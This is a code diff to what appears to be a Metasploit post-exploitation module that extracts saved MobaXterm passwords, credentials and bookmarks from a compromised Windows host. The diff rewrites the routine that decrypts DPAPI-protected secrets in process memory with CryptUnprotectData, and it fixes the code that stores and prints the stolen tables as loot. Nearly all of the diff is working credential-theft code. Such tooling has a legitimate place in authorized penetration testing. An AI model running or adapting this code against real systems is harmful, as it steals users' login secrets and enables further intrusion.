@@ -54,32 +54,49 @@ class MetasploitModule < Msf::Post
   end
 
   def windows_unprotect(entropy, data)
-    rg = session.railgun
-    pid = session.sys.process.getpid
-    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
-    mem = process.memory.allocate(data.length)
-    addr_entropy = session.railgun.util.alloc_and_write_string(entropy)
-    process.memory.write(mem, data)
-    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
-      addr = [mem].pack('V')
-      len = [data.length].pack('V')
-      elen = [entropy.length].pack('V')
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{[addr_entropy].pack('V')}", nil, nil, 0, 8)
-      len, addr = ret['pDataOut'].unpack('V2')
-    else
-      addr = Rex::Text.pack_int64le(mem)
-      len = Rex::Text.pack_int64le(data.length)
-      eaddr = Rex::Text.pack_int64le(mem2)
-      elen = Rex::Text.pack_int64le(ent.length)
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
-      p_data = ret['pDataOut'].unpack('VVVV')
-      len = p_data[0] + (p_data[1] << 32)
-      addr = p_data[2] + (p_data[3] << 32)
+    begin
+      pid = session.sys.process.getpid
+      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+
+      # write entropy to memory
+      emem = process.memory.allocate(128)
+      process.memory.write(emem, entropy)
+      # write encrypted data to memory
+      mem = process.memory.allocate(128)
+      process.memory.write(mem, data)
+
+      #  enumerate all processes to find the one that we're are currently executing as,
+      #  and then fetch the architecture attribute of that process by doing ["arch"]
+      #  to check if it is an 32bits process or not.
+      if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+        addr = [mem].pack('V')
+        len = [data.length].pack('V')
+
+        eaddr = [emem].pack('V')
+        elen = [entropy.length].pack('V')
+
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
+        len, addr = ret['pDataOut'].unpack('V2')
+      else
+        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
+        addr = Rex::Text.pack_int64le(mem)
+        len = Rex::Text.pack_int64le(data.length)
+
+        eaddr = Rex::Text.pack_int64le(emem)
+        elen = Rex::Text.pack_int64le(entropy.length)
+
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
+        p_data = ret['pDataOut'].unpack('VVVV')
+        len = p_data[0] + (p_data[1] << 32)
+        addr = p_data[2] + (p_data[3] << 32)
+      end
+      return '' if len == 0
+
+      return process.memory.read(addr, len)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
-
-    return '' if len == 0
-
-    process.memory.read(addr, len)
+    return ''
   end
 
   def key_crafter(config)
@@ -114,7 +131,7 @@ class MetasploitModule < Msf::Post
 
         pt << (16 * h + l)
       end
-      p pt.pack('c*')
+      pp pt.pack('c*')
     end
   end
 
@@ -310,19 +327,19 @@ class MetasploitModule < Msf::Post
       bookmarks_result.each do |item|
         bookmarks_tbl << item.values
       end
-      if pw_tbl.count
-        path = store_loot('host.moba_xterm', 'text/plain', session, tbl, 'moba_xterm.txt', 'MobaXterm Password')
+      if pw_tbl.rows.count
+        path = store_loot('host.moba_xterm', 'text/plain', session, pw_tbl, 'moba_xterm.txt', 'MobaXterm Password')
         print_good("Passwords stored in: #{path}")
         print_good(pw_tbl.to_s)
       end
-      if creds_tbl.count
-        path = store_loot('host.moba_xterm', 'text/plain', session, tbl, 'moba_xterm.txt', 'MobaXterm Credentials')
+      if creds_tbl.rows.count
+        path = store_loot('host.moba_xterm', 'text/plain', session, creds_tbl, 'moba_xterm.txt', 'MobaXterm Credentials')
         print_good("Credentials stored in: #{path}")
         print_good(creds_tbl.to_s)
       end
-      next unless bookmarks_tbl.count
+      next unless bookmarks_tbl.rows.count
 
-      path = store_loot('host.moba_xterm', 'text/plain', session, tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')
+      path = store_loot('host.moba_xterm', 'text/plain', session, bookmarks_tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')
       print_good("Bookmarks stored in: #{path}")
       print_good(bookmarks_tbl.to_s)
     end
